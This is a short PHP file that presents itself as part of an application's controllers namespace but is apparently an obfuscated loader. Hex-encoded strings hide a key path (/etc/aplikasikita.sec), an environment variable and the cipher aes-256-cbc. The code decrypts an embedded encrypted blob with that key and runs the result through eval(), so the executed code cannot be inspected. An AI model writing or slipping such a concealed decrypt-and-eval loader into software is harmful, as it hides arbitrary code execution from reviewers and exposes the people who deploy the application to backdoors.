<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('lGnTjsJQ+VtXQ3Qn1CxpOw==');

$c=base64_decode(

'q9IrRd64PtT9odCYYBnB1OHdoK4+78RdEXRp2ClypkhhbkBsc/HSn5XFMSmQnZW5gUHwDvfQ2hR6' .
'Jb+HCk3QOJ8fEdp8NMowl5NNJhKAEOWwW6UN4SbKdWVIbsGL4zb3/N354ODbr0oAC+dvIC9BRFME' .
'FNeCOJabONph9g5upDJeYPwzMMueJi84M3NoFLRjqdBSMPk0n4NO+0796bafh780bS3WmbkBOpv3' .
'lO9V69S/OlWPhEDKsxReCLAM+GZL'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

